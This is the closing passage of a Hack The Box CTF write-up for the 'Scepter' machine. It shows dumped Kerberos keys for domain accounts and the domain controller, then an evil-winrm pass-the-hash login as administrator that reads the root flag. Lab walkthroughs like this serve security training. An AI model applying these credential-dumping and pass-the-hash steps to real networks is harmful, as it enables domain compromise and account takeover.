class="line">scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb</span><br><span class="line">scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19</span><br><span class="line">scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1</span><br><span class="line">scepter.htb\a.carter:aes256-cts-hmac-sha1-96:90594ff6a706542e6e5f83a4f8108dc9f203b2fa12d512cdc7180ba41fd46c38</span><br><span class="line">scepter.htb\a.carter:aes128-cts-hmac-sha1-96:a875ed3af2f895dfc8940fdc48eac5ea</span><br><span class="line">scepter.htb\a.carter:des-cbc-md5:3d267fd95eab6883</span><br><span class="line">scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02</span><br><span class="line">scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d</span><br><span class="line">scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7</span><br><span class="line">scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f</span><br><span class="line">scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f</span><br><span class="line">scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61</span><br><span class="line">scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b</span><br><span class="line">scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea</span><br><span class="line">scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f</span><br><span class="line">scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25</span><br><span class="line">scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb</span><br><span class="line">scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7</span><br><span class="line">scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0</span><br><span class="line">scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598</span><br><span class="line">scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a</span><br><span class="line">DC01$:des-cbc-md5:d6923e61a83d51ef</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                     </span><br></pre></td></tr></table></figure></div>

<p>And now fetch our root flag:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ evil-winrm -i dc01.scepter.htb  -u administrator -H a291ead3493f9773dc615e66c2ea21c4            </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                                                 </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                                                   </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">4d44c8793e7ff83f2a5673fd718eeb03</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br></pre></td></tr></table></figure></div>

<p>That was it for scepter, hope you learned something new!</p>
<p>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: Scepter</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-07-18 11:23:45</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-07-18 12:10:32
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/07/18/Hackthebox-Scepter/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/07/10/Hackthebox-Dog/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Dog</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: Scepter</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
